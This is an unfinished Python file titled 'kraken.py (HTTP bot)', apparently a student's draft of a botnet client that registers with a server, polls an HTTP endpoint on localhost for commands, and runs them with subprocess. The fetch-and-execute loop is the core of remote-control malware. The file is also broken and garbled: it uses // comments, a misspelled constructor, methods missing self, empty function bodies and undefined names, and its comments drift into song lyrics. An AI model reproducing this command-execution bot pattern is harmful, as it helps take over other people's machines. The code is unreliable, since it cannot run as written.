#!/usr/bin/env python3
// Amanda Brown (aeb6590) 
// kraken.py (HTTP bot) 

import socket
import requests
import subprocess
import threading
import time
from random import * 

PORT = 8080
servStat = False

// request to server to register

class Bot:
    def _init_(self,uuid):
        self.uuid = getUUID()

    def connect():
        // Create socket object 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = socket.gethostname() 
        s.connect((host, PORT))
        servStat = True
        //continue 
    
    def getUUID():
        uuid = random() 
        // server should check if this is valid num
        return uuid

    def request():
        r = requests.get('http://127.0.0.1') 
        cmd = r.json()
        execution(cmd)

    def execution(cmd):
        command = cmd.split() 
        subprocess.run(command)
        // if execution is successful store in data to be sent 

    def response():


t1 = threading.Thread(target = updater) 
t2 = threading.Thread(target = function, args = ())

def updater(): 
    while (servStat): 
        time.sleep(3)
    // send update of hi i am alive
    // but barely breathing
    // and hes got time while shes got freeeeedom
    // and when a heart breaks no it dont break even 
    // even 
    // ooooooh 

b = Bot(random())

def main_not_main(): 
    // run the bots execution 

def main():
    // run the threads 
